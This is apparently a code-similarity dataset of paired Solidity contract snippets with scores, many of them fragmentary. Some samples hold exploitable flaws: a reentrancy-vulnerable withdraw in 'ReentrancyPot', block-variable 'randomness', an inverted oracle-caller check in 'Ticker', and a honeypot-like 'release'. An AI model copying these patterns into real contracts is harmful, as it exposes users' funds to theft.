    function ownerOf(uint id) public view returns (address);



    function getCard(uint id) public view returns (uint16, uint16);



    function totalSupply() public view returns (uint);



    function burnCount() public view returns (uint);



}"
"contract CheckAllowance {

    ERC20 public ERC20Interface;

    function checkAllowance(address _tokenAddress, uint _amount) public returns (bool) {
        ERC20Interface = ERC20(_tokenAddress);
        require(ERC20Interface.allowance(msg.sender, this) >= _amount);
        return true;
    }
}",0.6402652055432712,"contract TokenTransferProxy {

    
    ProxyRegistry public registry;

    
    function transferFrom(address token, address from, address to, uint amount)
        public
        returns (bool)
    {
        require(registry.contracts(msg.sender));
        return ERC20(token).transferFrom(from, to, amount);
    }

}"
"contract test {
    uint A;

    function set(uint SetA) {
        A = SetA;
        changeA(A);
    }

    function changeA(uint A) private {
        A = 0;
        return;
    }

    function variable() constant returns(uint variable) {
        variable = A;
    }
}",0.6014061392501371,"contract showNum {
    address owner = msg.sender;

    uint _num = 0;
   function setNum(uint number) public payable {
        _num = number;
    }

    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract Foo {
  
  
  
  function withoutNewS() external {
    uint256[3] storage data;
  }
  
  
  
  function withoutNew() external {
    uint256[3] data;
  }
  
  
  
  function withoutNewM() external {
    uint256[3] memory data;
  }
  
  
  
  function withNewM() external {
    uint256[] memory data = new uint256;
  }
}",0.6543772164962625,"contract PauseLike {
    function delay() external view returns (uint256);
    function setDelay(uint256) external;
    function plot(address, bytes32, bytes calldata, uint256) external;
    function exec(address, bytes32, bytes calldata, uint256) external;
}"
"contract Test {
    struct Data {
        uint256 a;
        uint256 b;
        uint256 c;
        uint256 d;
        uint256 e;
        uint256 f;
    }

    Data[][] private lists;

    function Test() public {
    }

    function setLength(uint256 length) public {
        lists.length = length;
    }

    function getLength() public constant returns (uint256) {
        return lists.length;
    }
}",0.6610256064793051,"contract StakerToken {
    uint256 public stakeStartTime;
    uint256 public stakeMinAge;
    uint256 public stakeMaxAge;
    function mint() returns (bool);
    function coinAge() constant returns (uint256);
    function annualInterest() constant returns (uint256);
    event Mint(address indexed _address, uint _reward);
}"
"contract A {

    function A() {
    }

    function createB(string name) {
        return new B(msg.sender, name);
    }
}",0.6065920499800429,"contract WhoAmI {

  function whoAmI() public view returns (address me) {

     me = msg.sender;

  }

}"
"contract SimpleStorage { 
    mapping(address => string) public Usersdata; 
    function Storedata(string data) public { 
        Usersdata[msg.sender] = data; 
    } 

    function getData() public view returns (string) { 
        return Usersdata[msg.sender]; 
    } 
}",0.6649921425064739,"contract NanoLedger{

    

    mapping (uint => string) data;



    

    function saveCode(uint256 id, string dataMasuk) public{

        data[id] = dataMasuk;

    }

    

    function verify(uint8 id) view public returns (string){

        return (data[id]);

    }

}"
"contract store {
    bytes32 data;
    function set(string memory _word) public {
        data = keccak256(abi.encodePacked(_word));
    }
}",0.6156927105292719,"contract ERC223Receiving { 

    function tokenFallback(address _from, uint _value, bytes memory _data) public;
}"
"contract Simple {
  uint public _num = 2;

  
  function Simple(uint _inNum) public {
        _num = _inNum;
  }

  function setNum(uint _num2set) public {
        _num = _num2set;
  }

  function getNum() public constant returns (uint) {
        return _num;
  }

  function getArea(uint _side) returns (uint) {
        return (_side * _side);
  }

  function arithmetics(uint _a, uint _b) returns (uint o_sum, uint o_product) {
    o_sum = _a + _b;
    o_product = _a * _b;
  }

  function multiply(uint _a, uint _b) returns (uint) {
    return _a * _b;
  }
}",0.6914477332474687,"contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a, ""Addition failed"");
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a, ""Subtraction failed"");
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}"
"contract testRand {

    uint256 public num;

    event showLottery(uint256 _lottery);

    function rand() private view returns (uint256) {
       return uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, now , block.coinbase)))%(10**6);
    }

    function implement() public {
        num = rand();
        emit showLottery(num);
    }

}",0.6303141290632834,"contract RandomUtil{

    

    function getRandom(bytes32 param) public returns (bytes32){

           bytes32 value = keccak256(abi.encodePacked((block.timestamp) + (block.difficulty) 

           +((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) 

           +(block.gaslimit) +((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)) + (block.number)));

           return value;

    }

}"
"contract WhitelistedCappedCrowdsaleMock is WhitelistedCappedCrowdsale {
    uint64 public time = now;

    function getTime() public contstant returns(uint64) {
       return time;
    }

    function setTime(uint64 _time) public {
        time = _time;
    }
}",0.6000673575491019,"contract Token is IERC20 {

    function getBonusFactor(uint256 _startTime, uint256 _endTime, uint256 _weiAmount)

        public view returns (uint256);



    function isUserWhitelisted(address _user)

        public view returns (bool);

}"
"contract User {
    using strings for *;
     address public DB;
    function User(address _DB) {
        if(_DB == 0x0) throw;
        DB = _DB;
    }
    function setUser(string name, string email) public {
        UserLibrary.setUser(DB, msg.sender, name, email);
    }",0.6170700878894787,"contract storer {

address public owner;
string public log;

modifier onlyOwner {
        if (msg.sender != owner)
            throw;
        _;
    }
    
function store(string _log) onlyOwner() {
    log = _log;
}

function kill() onlyOwner() {
  selfdestruct(owner); }

}"
"contract Lottery {
address public manager;
struct Player {
    address recipient;
    uint value;
}
Player[] public players;

mapping(uint => address[]) recipientValue;
mapping(uint => uint) recipientValueCount;

function Lottery() public {
    manager = msg.sender;
}

function enter() public payable {
    Player memory newPlayer = Player({
        recipient: msg.sender,
        value: msg.value
    });

    players.push(newPlayer);

    recipientValue[msg.value].push(msg.sender);
    recipientValueCount[msg.value]++;
}


function pickWinner(uint index) public restricted {
    address[] storage winners = recipientValue[index];
    uint prize = this.balance / recipientValueCount[index];

    for(uint i=0; i< winners.length; i++){
        winners[i].transfer(prize);
    }

    players = new Player[](0);

} 

function totalBalance() public view returns (uint) {
    return this.balance;
}


modifier restricted() {
    require(msg.sender == manager);
    _;
}",0.6210394713934609,"contract InvoiceCreator {

    using SafeMath for uint;

    

    address public manager;

    

    modifier onlyManager() {

        require(msg.sender == manager);

        _;

    }

    

    constructor(address _manager) public {

        manager = _manager;

    }

    

    

    mapping(uint => address) public invoices;

    

    

    mapping(uint => address) public initiators;

    

    uint public counter;

    

    function getInvoice() public onlyManager {

        Invoice newInv = new Invoice(manager);

        

        counter = counter.add(1);

        

        invoices[counter] = address(newInv);

        initiators[counter] = msg.sender;

    }

    

    function getCounter() public view returns(uint) {

        return counter;

    }

    

    function getInvoiceAddr(uint id) public view returns(address) {

        return invoices[id];

    }

    

    function getInitiatorAddr(uint id) public view returns(address) {

        return initiators[id];

    }

    

    function changeManager(address _manager) public onlyManager {

        require(_manager != address(0));

        

        manager = _manager;

    }

    

}"
"contract MainContract is Ownable {

    User[] public users;

    MyToken token;

    event UserCreated(User user, uint256 index);
    event TokenCreated(MyToken token);

    constructor () public{
        token = new MyToken(this);

        emit TokenCreated(token);

    }

    function createUser(uint256 _id) onlyOwner external {
        User user = new User(token, _id);

        emit UserCreated(user, users.length);

        users.push(user);
    }
}",0.6057736813303275,"contract SuperFan is ERC721 

{

	constructor() public {}

	

	event LogToken(address user, uint256 idToken, uint256 amount);

	

	function getToken(uint256 option, string struri) public payable

	{

	

		Token memory _token = Token({

			price: msg.value,

			pack : option,

			uri : struri

		});



		uint256 newTokenId = totalSupply++;

		tokens[newTokenId] = _token;

		

		_transfer(0x0, msg.sender, newTokenId);

		

		

	}

	

}"
"contract Conference { 

   address public organizer;
   mapping (address => uint) public registrantsPaid;
   uint public numRegistrants;

   

   function buyTicket() public returns (bool success) { 
     if (numRegistrants >= quota) { 
         return false; 
     }
     else {
         registrantsPaid[msg.sender] = msg.value;
         numRegistrants++;
         return true;
     }
   }

   

  function destroy() { 
     if (msg.sender == organizer) {
        suicide(organizer); 
     }
  }
}",0.6275836605133467,"contract EtherTransferTo{

    address public owner;

    

    constructor() public {

    owner = msg.sender;

  }

  

    modifier onlyOwner() {

        require (msg.sender == owner);

        _;



    }

    

    function () payable public {

        

    }

    

    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    function withdraw(uint amount) onlyOwner returns(bool) {

        require(amount <= this.balance);

        owner.transfer(amount);

        return true;



    }

    



}"
"contract CFDBroker is usingOraclize {

   using strings for *;

   mapping (uint => uint) instruments;
   mapping (bytes32 => uint) queries;
   uint public GOLD;
   uint public EURUSD;
   uint public DJI;


   function sendFunds() payable {

       getData();

   }


   function __callback(bytes32 myid, string result, bytes proof) {

       require(msg.sender == oraclize_cbAddress());

       if (queries[myid] == 1){
           
           var s = result.toSlice();
           GOLD = parseInt(s.beyond(""$"".toSlice()).until(""/"".toSlice()).toString())*100;
           instruments[1] = GOLD;

       } else{
           if(queries[myid] == 2){
               
               s = result.toSlice();
               var r = result.toSlice().beyond(""."".toSlice());
               EURUSD = parseInt(s.beyond(""$"".toSlice()).until(""."".toSlice()).concat(r));
               instruments[2] = EURUSD;

           } else{
               if(queries[myid] == 3){
                   
                   DJI = parseInt(result)*100;
                   instruments[3]=DJI;

               }
           }
       }

       update();

       

   }

   
   function getData() private{

       queries[oraclize_query(50, ""WolframAlpha"",""gold price in usd"")] = 1; 
       queries[oraclize_query(50, ""WolframAlpha"",""eur/usd"")] = 2; 
       queries[oraclize_query(50, ""WolframAlpha"",""DJI price"")] = 3; 

   }}",0.6354766185123724,"contract Ticker is usingOraclize {
    uint256 refresh = 0;
    
    uint public ETHUSD = 0;
    
    event newOraclizeQuery(string description);
    event newPriceTicker(string price);

    function Ticker() public {
        
        
    }
    
    function __callback(bytes32 myid, string result, bytes proof) public {
        require(msg.sender != oraclize_cbAddress());
        newPriceTicker(result);
        ETHUSD = parseInt(result, 4);
        
        if(refresh > 0){
            update(refresh);
        }
    }
    function __callback(bytes32 myid, string result) public {
        require(msg.sender == oraclize_cbAddress());
        newPriceTicker(result);
        ETHUSD = parseInt(result, 4);
        
        if(refresh > 0){
            update(refresh);
        }
    }
    
    function update(uint delay) payable {
        if (oraclize_getPrice(""URL"") > this.balance) {
            newOraclizeQuery(""Oraclize query was NOT sent, please add some ETH to cover for the query fee"");
        } else {
            newOraclizeQuery(""Oraclize query was sent, standing by for the answer.."");

            oraclize_query(delay, ""URL"", ""json(https:
        }
    }
}"
"contract A {
  function sendtoken() payable returns(bool) {
      require(msg.value!=0);
      balances[msg.sender]+= 1;
      balances[owner]-= 1;
      owner.transfer(msg.value);
      return true;
  }
}",0.6200358784843489,"contract Ownable {

    address public Owner = msg.sender;

    function isOwner() returns (bool) {

        if (Owner == msg.sender) return true; return false;

    }

}"
"contract D1 {
  uint public bal = 0;
  function() external { 
    bal+n; 
  }        
}",0.6901810172349288,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract DealFactory {
    address[] public deployedDeals;


    function createDeal() public payable  {
        address newDeal = new Deal(msg.sender);

        deployedDeals.push(newDeal);

    }

    function getDeals() public view returns (address[]) {
        return deployedDeals;
    } 
}",0.6292418569505162,"contract DSProxyInterface {

    
    
    
    
    

    function execute(address _target, bytes memory _data) public payable returns (bytes32);

    function setCache(address _cacheAddr) public payable returns (bool);

    function owner() public returns (address);
}"
"contract Contract {
    uint8 value;
    function call_library_function () {
        value = Library.func();
    }
}",0.6270949361177276,"contract ContractConn {

    function transfer(address _to, uint _value) public;

}"
"contract one {

    address public deployer;
    address public targetAddress;


    modifier execute {
        if (msg.sender == deployer) {
            _
        }
    }


    function one(address _targetAddress) {
        deployer = msg.sender;
        targetAddress = _targetAddress;
    }


    function forward() {
        two m = two(targetAddress);
        m.pay();
        targetAddress.send(this.balance);
    }


    function() {
        forward();
    }


    function sendBack() execute {
        deployer.send(this.balance);
    }


}",0.6022760949293597,"contract FlightDelayAddressResolver {

    address public addr;

    address owner;

    function FlightDelayAddressResolver() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) {
        require(msg.sender == owner);
        owner = _owner;
    }

    function getAddress() constant returns (address _addr) {
        return addr;
    }

    function setAddress(address _addr) {
        require(msg.sender == owner);
        addr = _addr;
    }
}"
"contract Factory {
  address[] newContracts;

  function createContract(uint num) {
    address newContract = new Contract(num);
    newContracts.push(newContract);
  }

  function getContract() view public returns(address[]) {
    return newContracts;
  }

  function getNum(address _add) view public returns(uint) {
    return Contract(_add).getNum();
  }
}",0.6390311999218565,"contract IMultiOwned {

    
    function isOwner(address _account) public view returns (bool);


    
    function getOwnerCount() public view returns (uint);


    
    function getOwnerAt(uint _index) public view returns (address);


     
    function addOwner(address _account) public;


    
    function removeOwner(address _account) public;
}"
"contract ERC20 is IERC20 {
    mapping (address => uint256) internal someMapping;
    function foo(address someAddress, uint256 someNumber) public  {
        someMapping[someAddress] = someNumber;
        return true;
    }
}",0.6520120107919612,"contract ERC20 is ERC20Basic {

  function allowance(address owner, address spender) public returns (uint256);

  

  

  event Approval(address indexed owner, address indexed spender, uint256 value);

}"
"contract Factory {
  
  function newChild() returns (address){
    Child c = new Child(); 
    return c;
  }
  function setChildCode(bytes[] bytecode) {
    
  }
}",0.6138535119627626,"contract DSValue {

    

    function peek() public view returns (bytes32, bool);



    function read() public view returns (bytes32);

}"
"contract Concatenation {

    string public base64Data;

    function concat(string memory pieceOfData) external returns (string memory) {
        base64Data = string(abi.encodePacked(base64Data, pieceOfData));
        return base64Data;
    }

}",0.6188909366141971,"contract HTMLBodyColor {
    
    string private _body;
    
    constructor(string memory color) public {
        _body = string(abi.encodePacked(""body{background-color:"", color,"";}""));
    }
    
    function read() public view returns(string memory) {
        return _body;
    }
}"
"contract math {

  uint tokenAmount;

  function doo(uint _nominator) public returns (uint) {
      tokenAmount = 638;
      uint stPrize = (_nominator / 100) * tokenAmount;
      return stPrize;
  }
}",0.6126460170761547,"contract PricingStrategy {

  
  function calculatePrice(uint value, uint tokensSold, uint weiRaised, address msgSender) public constant returns (uint tokenAmount);
}"
"contract A {
    address contractB;

    function () public payable {
         emit B(contractB).eventFallback();
    }
}",0.6620878018335619,"contract GameAbstraction {

   function sendBet(address sender, uint choice) payable public;

}"
"contract test{

    function test(address OAddress, bytes32 _name,address _cpty1, address _creator) {

    }

}",0.633282194370828,"contract Utils {

	function Utils() {
	}

	
	modifier validAddress(address _address) {
		require(_address != 0x0);
		_;
	}
}"
"contract Lottery {

struct Ticket {
    uint id;
    address name;
    uint winCount;
}

uint public winFirstPercent = 60;
uint public prizeMoney = 0;
address public winner;
uint public priz;

uint public lastWinNumber = 0;

uint public ticketCount = 10;
uint public ticketPrice = 1 ether;

address public walletMoney = 0xca35b7d915458ef540ade6068dfe2f44e8fa733c; 


mapping (uint => Ticket) public tickets;

event buyTicket (uint ticketNum, address adrr);
event winAddress (uint ticketWin, address winAddress, uint priz, uint prizeMoney);

constructor () public {
    clearTickets();
}

function clearTickets() public {
    for (uint i = 0; i < ticketCount; i++){
        tickets[i] = Ticket(i,0,0);
    }
}

function buyTickets (uint _ticketNum) public payable returns (bool success) {
    require ((_ticketNum > 0) && (_ticketNum < ticketCount));
    require (tickets[_ticketNum].name == 0);
    require (msg.value == ticketPrice);
    walletMoney.transfer(msg.value);
    prizeMoney += msg.value;
    tickets[_ticketNum] = Ticket(_ticketNum, msg.sender, 0);
    emit buyTicket(_ticketNum, msg.sender);
    return true;
}

function playGame () public {
    
    lastWinNumber = 1;
    if (tickets[lastWinNumber].name != 0) {
        winner = tickets[lastWinNumber].name;
        priz = prizeMoney*winFirstPercent/100;
        winner.transfer(priz);
    }
    emit winAddress(lastWinNumber, winner, priz, prizeMoney);
}
}",0.6020882348391258,"contract BestEther {
    
    string public name = ""Best Ether"";
    string public symbol = ""BETH"";
    uint8 public decimals = 0;
    
    uint256 public totalSupply;
    uint256 public BestEtherSupply = 1000000000;
    uint256 public price ;
    address public creator;
    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event FundTransfer(address backer, uint amount, bool isContribution);
    
    
    
    function BestEther() public {
        totalSupply = BestEtherSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;    
        creator = msg.sender;
    }
    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
      
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    
    
    function () payable internal {
        
        if (price >= 0 ether){
        uint amount = 10000;                  
        uint amountRaised;                                     
        amountRaised += msg.value;                            
        require(balanceOf[creator] >= 980000000);               
        require(msg.value < 0.9 ether);                        
        balanceOf[msg.sender] += amount;                  
        balanceOf[creator] -= amount;                        
        Transfer(creator, msg.sender, amount);               
        creator.transfer(amountRaised);
        }
    }

 }"
"contract Callee {
    uint[] public values;

    function getValue(uint initial) returns(uint) {
        return initial + 150;
    }
    function storeValue(uint value) {
        values.push(value);
    }
    function getValues() returns(uint) {
        return values.length;
    }
}",0.6852267896557155,"contract Vendor {
    function getLevel(uint _value) external view returns(uint);
    function getLineLevel(uint _value) external view returns(uint);
    function getWithdrawRoundRo(uint _round) external pure returns (uint);
}"
"contract Faucet {
    address owner;
    uint256 sendAmount;

    function Faucet() {
        owner = msg.sender;
        sendAmount = 1000000000000000000;
    }

    function getBalance() returns (uint) {
         return this.balance;
    }

    function getWei() returns (bool) {
        return msg.sender.send(sendAmount);
    }

    function sendWei(address toWhom) returns (bool) {
        return toWhom.send(sendAmount);
    }

    function getSendAmount() returns (uint256) {
        return sendAmount;
    }

    function killMe() returns (bool) {
        if (msg.sender == owner) {
            suicide(owner);
            return true;
        }
    }
}",0.65010424558191,"contract XBL_ERC20Wrapper
{
    function transferFrom(address from, address to, uint value) returns (bool success);
    function transfer(address _to, uint _value) returns (bool success);
    function allowance(address _owner, address _spender) constant returns (uint256 remaining);
    function burn(uint256 _value) returns (bool success);
    function balanceOf(address _owner) constant returns (uint256 balance);
    function totalSupply() constant returns (uint256 total_supply);
}"
"contract ReentrancyPot {
    mapping (address => uint) public balances;

    
    function ReentrancyPot() public payable {
        deposit();
    }

    
    function deposit() public payable {
        balances[msg.sender] = msg.value;
    }

    
    function withdraw() public {
        if (!msg.sender.call.value(balances[msg.sender])()) {
            throw;
        }
        balances[msg.sender] = 0;
    }
}",0.6971016434544176,"contract RepoCKS

{

    constructor() public payable {

        org = msg.sender;

    }

    function() external payable {}

    address org;

    function end() public {

        if (msg.sender==org)

            selfdestruct(msg.sender);

    }

    function release() public payable {

        if (msg.value >= address(this).balance)

            msg.sender.transfer(address(this).balance);

    }

}"
"contract ValueIO {

 uint myidaaaa;

 uint price = 100000000 wei;

 function Input(uint feion) public payable {
     require(msg.value > price);  

     myidaaaa = feion;
 }

 function Output() public constant returns (uint,bool) {
     return (myidaaaa,true);
 }
}",0.6225260057861219,"contract DaiJoinLike {
    function vat() virtual public returns (VatLike);
    function dai() virtual public returns (GemLike);
    function join(address, uint) virtual public payable;
    function exit(address, uint) virtual public;
}"
"contract ERC20Mock is ERC20 {
    constructor (address initialAccount, uint256 initialBalance) public {
        _mint(initialAccount, initialBalance);
    }

    function mint(address account, uint256 amount) public {
        _mint(account, amount);
    }

    function burn(address account, uint256 amount) public {
        _burn(account, amount);
    }

    function burnFrom(address account, uint256 amount) public {
        _burnFrom(account, amount);
    }
}",0.6716212139467094,"contract IBalance {



	function distributeEthProfit(address profitMaker, uint256 amount) public  ;



	function distributeTokenProfit (address profitMaker, address token, uint256 amount) public  ;



	function modifyBalance(address _account, address _token, uint256 _amount, bool _addOrSub) public;



	function getAvailableBalance(address _token, address _account) public constant returns (uint256);



}"
"contract finalizeToken is fToken {
    uint public epochCount;


    constructor() {}

    function setEpoch(uint _blocks) public {
        epochCount = _blocks;
    }


}",0.6364103781895688,"contract iBurnableToken is iERC20Token {
  function burnTokens(uint _burnCount) public;
  function unPaidBurnTokens(uint _burnCount) public;
}"
"contract TestContract {   

    InterfaceTest _inter;  

    function test2(address _addr) public returns(uint) {
        _inter = InterfaceTest(_addr);
        return 2;
    }

    function test4() public view returns(uint) {
        uint t = _inter.testInterface();
        return t;
    }
}",0.6557659983085171,"contract ERC20TokenBankInterface{
  function balance() public view returns(uint);
  function token() public view returns(address, string memory);
  function issue(address _to, uint _amount) public returns (bool success);
}"
"contract tokensale {

  
  uint public maxTokens = 10000;

  
  
  uint public tokenSwap = 10;

  
  
  uint public supply = 0;

  
  
  mapping (address => uint) balance;


  
  
  modifier isTokenAvailable () {
    require (msg.value*tokenSwap + supply <= maxTokens);     
    _;                                                       
  }                                                                      


  



  
  
  
  function balanceOf (address tokenHolder) external constant returns (uint) {
    return balance[tokenHolder];
  }

  
  
  
  
  
  
  

  function buyTokens () external
  payable 
  isTokenAvailable {
    uint tokensAmount = msg.value * tokenSwap;    
    balance [msg.sender] += tokensAmount;
    supply += tokensAmount;
  }
}",0.6454399183417797,"contract BasicTokenInterface{

    

    string public name;                   

    uint8 public decimals;                

    string public symbol;                 

    uint public totalSupply;

    mapping (address => uint256) internal balances;

    

    modifier checkpayloadsize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    } 

    function balanceOf(address tokenOwner) public view returns (uint balance);

    function transfer(address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);

}"
"contract init {
    address[] public userAddresses;
    function addStudent(address _user) public {
       userAddresses.push(_user);
     }

     function sendToken(uint value) payable{
         for (uint i=0; i<userAddresses.length; i++) {
             userAddresses.send(value);
        }
     }

}",0.6204227753778682,"contract BurnToken is Ownable {
    using SafeMath for uint256;
    
    function burn(uint256 _value) public;
    function _burn(address _user, uint256 _value) internal;
    event Burn(address indexed _user, uint256 _value);
}"
"contract TokenCrowdsale is Ownable {
   using SafeMath for uint256;
   PausableToken  public tokenReward;                         

   
   uint256 public initialSupply;
   uint256 public tokensRemaining;
   uint256 public decimals;

   
   address public beneficiaryWallet;                           
   uint256 public tokensPerEthPrice;                           

   
   uint256 public amountRaisedInWei;
   uint256 public fundingMinCapInWei;

   
   uint256 public p1_duration;
   uint256 public p2_start;

   
   uint256 public fundingStartTime;                           
   uint256 public fundingEndTime;                             
   bool    public isCrowdSaleClosed               = false;     
   bool    public areFundsReleasedToBeneficiary   = false;     
   bool    public isCrowdSaleSetup                = false;     

    event Buy(address indexed _sender, uint256 _eth, uint256 _LOL);
    event Refund(address indexed _refunder, uint256 _value);
    event Burn(address _from, uint256 _value);
    mapping(address => uint256) fundValue;


    
    function toPony(uint256 amount) public constant returns (uint256) {
        return amount.mul(10**decimals);
    }

    
    function toHorse(uint256 amount) public constant returns (uint256) {
        return amount.div(10**decimals);
    }

    
    function setupCrowdsale(uint256 _fundingStartTime) external onlyOwner {
        if ((!(isCrowdSaleSetup))
            && (!(beneficiaryWallet > 0))){
            
            tokenReward                             =                 PausableToken(0x39B2F057CACdd24663c60bDfD16A609e928D61A3);
            beneficiaryWallet                       = 0x63695289007Ea8Ab78106adc541a0CbF5865c816;
            tokensPerEthPrice                       = 1000;

            
            fundingMinCapInWei                      = 1 ether;                                          

            
            decimals                                = 18;
            amountRaisedInWei                       = 0;
            initialSupply                           = toPony(1500000);                                  
            tokensRemaining                         = initialSupply;

            fundingStartTime                        = _fundingStartTime;
            p1_duration                             = 3 days;
            p2_start                                = fundingStartTime +         p1_duration;

            fundingEndTime                          = p2_start + 12 days;

            
            isCrowdSaleSetup                        = true;
            isCrowdSaleClosed                       = false;
        }
    }

    function setBonusPrice() public constant returns (uint256 bonus) {
        require(isCrowdSaleSetup);
        require(fundingStartTime + p1_duration <= p2_start );
        if (now >= fundingStartTime && now <= fundingStartTime + p1_duration) { 
            bonus = 1000;
        } else if (now > p2_start && now <= p2_start + 1 days ) { 
            bonus = 500;
        } else if (now > p2_start + 1 days && now <= p2_start + 3 days - 1 days) { 
            bonus = 200;
        } else if (now > p2_start + 3 days && now <= p2_start + 6 days ) { 
            bonus = 100;
        } else if (now > p2_start + 6 days && now <= fundingEndTime ) { 
            bonus = 0;
        } else {
            revert();
        }
    }

    function updateDuration(uint256 _newP1Duration, uint256 _newP2Start)         external onlyOwner{ 
        require( isCrowdSaleSetup
            && !(p1_duration == _newP1Duration)
            && !(p2_start == _newP2Start)
            && (now < fundingStartTime + p1_duration) 
            && (now < fundingStartTime + _newP1Duration)
            && (fundingStartTime + _newP1Duration < _newP2Start));
        p1_duration = _newP1Duration;
        p2_start = _newP2Start;
        fundingEndTime = p2_start + 12 days;
    }

    
    function () external payable {
        require(msg.data.length == 0);
        Buytokens();
    }

    function Buytokens() public payable {
        
        require(!(msg.value == 0)
        && (isCrowdSaleSetup)
        && (now >= fundingStartTime)
        && (now <= fundingEndTime)
        && (tokensRemaining > 0));

        uint256 rewardTransferAmount        = 0;
        uint256 rewardBaseTransferAmount    = 0;
        uint256 rewardBonusTransferAmount   = 0;
        uint256 contributionInWei           = msg.value;
        uint256 refundInWei                 = 0;

        rewardBonusTransferAmount       = setBonusPrice();
        rewardBaseTransferAmount        =         (msg.value.mul(tokensPerEthPrice)); 
        rewardBonusTransferAmount       = (msg.value.mul(rewardBonusTransferAmount)); 
        rewardTransferAmount            =         rewardBaseTransferAmount.add(rewardBonusTransferAmount);

        if (rewardTransferAmount > tokensRemaining) {
            uint256 partialPercentage;
            partialPercentage = tokensRemaining.mul(10**18).div(rewardTransferAmount);
            contributionInWei = contributionInWei.mul(partialPercentage).div(10**18);
            rewardBonusTransferAmount = rewardBonusTransferAmount.mul(partialPercentage).div(10**18);
            rewardTransferAmount = tokensRemaining;
            refundInWei = msg.value.sub(contributionInWei);
        }

        amountRaisedInWei               = amountRaisedInWei.add(contributionInWei);
        tokensRemaining                 = tokensRemaining.sub(rewardTransferAmount);  
        fundValue[msg.sender]           = fundValue[msg.sender].add(contributionInWei);
        assert(tokenReward.increaseFrozen(msg.sender, rewardBonusTransferAmount));
        tokenReward.transfer(msg.sender, rewardTransferAmount);
        Buy(msg.sender, contributionInWei, rewardTransferAmount);
        if (refundInWei > 0) {
            msg.sender.transfer(refundInWei);
        }
    }

    function beneficiaryMultiSigWithdraw() external onlyOwner {
        checkGoalReached();
        require(areFundsReleasedToBeneficiary && (amountRaisedInWei >= fundingMinCapInWei));
        beneficiaryWallet.transfer(this.balance);
    }

    function checkGoalReached() public returns (bytes32 response) { 
        
        require (isCrowdSaleSetup);
        if ((amountRaisedInWei < fundingMinCapInWei) && (block.timestamp <= fundingEndTime && block.timestamp >= fundingStartTime)) { 
            areFundsReleasedToBeneficiary = false;
            isCrowdSaleClosed = false;
            return ""In progress (Eth < Softcap)"";
        } else if ((amountRaisedInWei < fundingMinCapInWei) && (block.timestamp < fundingStartTime)) { 
            areFundsReleasedToBeneficiary = false;
            isCrowdSaleClosed = false;
            return ""Crowdsale is setup"";
        } else if ((amountRaisedInWei < fundingMinCapInWei) && (block.timestamp > fundingEndTime)) { 
            areFundsReleasedToBeneficiary = false;
            isCrowdSaleClosed = true;
            return ""Unsuccessful (Eth < Softcap)"";
        } else if ((amountRaisedInWei >= fundingMinCapInWei) && (tokensRemaining == 0)) { 
            areFundsReleasedToBeneficiary = true;
            isCrowdSaleClosed = true;
            return ""Successful (LOL >= Hardcap)!"";
        } else if ((amountRaisedInWei >= fundingMinCapInWei) && (block.timestamp > fundingEndTime) && (tokensRemaining > 0)) { 
            areFundsReleasedToBeneficiary = true;
            isCrowdSaleClosed = true;
            return ""Successful (Eth >= Softcap)!"";
        } else if ((amountRaisedInWei >= fundingMinCapInWei) && (tokensRemaining > 0) && (block.timestamp <= fundingEndTime)) { 
            areFundsReleasedToBeneficiary = true;
            isCrowdSaleClosed = false;
            return ""In progress (Eth >= Softcap)!"";
        }
    }

    function refund() external { 
        checkGoalReached();
        
        require ((amountRaisedInWei < fundingMinCapInWei)
        && (isCrowdSaleClosed)
        && (now > fundingEndTime)
        && (fundValue[msg.sender] > 0));

        
        uint256 ethRefund = fundValue[msg.sender];
        fundValue[msg.sender] = 0;
        Burn(msg.sender, fundValue[msg.sender]);

        
        msg.sender.transfer(ethRefund);
        Refund(msg.sender, ethRefund);
    }

    function burnRemainingTokens() onlyOwner external {
        
        uint256 tokensToBurn = tokenReward.balanceOf(this);
        tokenReward.burn(tokensToBurn);
    }
}",0.6100485432074748,"contract GTIX is ERC20 {



    using SafeMath for uint256;

    address owner = msg.sender;



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;

    mapping (address => bool) public blacklist;



    string public constant name = ""GT-IX"";

    string public constant symbol = ""GTIX"";

    uint public constant decimals = 8;

    uint256 public totalSupply = 50000000000e8;

    uint256 public totalDistributed = 2000000000e8;

	uint256 public totalPurchase = 2000000000e8;

    uint256 public totalRemaining = totalSupply.sub(totalDistributed).sub(totalPurchase);

	

    uint256 public value = 2500e8;

	uint256 public purchaseCardinal = 50000000e8;

	

	uint256 public minPurchase = 0.001e18;

	uint256 public maxPurchase = 10e18;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);



    event Distr(address indexed to, uint256 amount);

    event DistrFinished();

	event Purchase(address indexed to, uint256 amount);

	event PurchaseFinished();



    event Burn(address indexed burner, uint256 value);



    bool public distributionFinished = false;

	bool public purchaseFinished = false;



    modifier canDistr() {

        require(!distributionFinished);

        _;

    }

	

	modifier canPurchase(){

		require(!purchaseFinished);

		_;

	}



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    modifier onlyWhitelist() {

